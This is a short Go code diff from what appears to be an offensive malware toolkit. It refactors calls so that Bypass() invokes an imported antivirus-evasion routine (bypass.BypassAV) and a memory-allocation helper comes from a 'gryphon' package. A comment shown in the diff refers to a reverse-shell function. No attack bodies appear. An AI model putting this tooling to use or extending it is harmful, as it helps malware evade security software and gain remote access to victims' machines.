@@ -20,6 +20,8 @@ import (
 
 	"bitbucket.org/kardianos/osext"
 	"github.com/fatih/color"
+	"github.com/whiterabb17/gryphon/bypass"
+	"github.com/whiterabb17/gryphon/variables"
 )
 
 var (
@@ -113,7 +115,7 @@ func FileToSlice(file string) []string {
 // Alloc allocates memory without use.
 func Alloc(size string) {
 	// won't this be immidiatly garbage collected?
-	_ = make([]byte, SizeToBytes(size))
+	_ = make([]byte, variables.SizeToBytes(size))
 }
 
 // GenCpuLoad gives the Cpu work to do by spawning goroutines.
@@ -199,7 +201,7 @@ func Remove() {
 }
 
 func Bypass() {
-	BypassAV()
+	bypass.BypassAV()
 }
 
 // Reverse initiates a reverse shell to a given host:port.
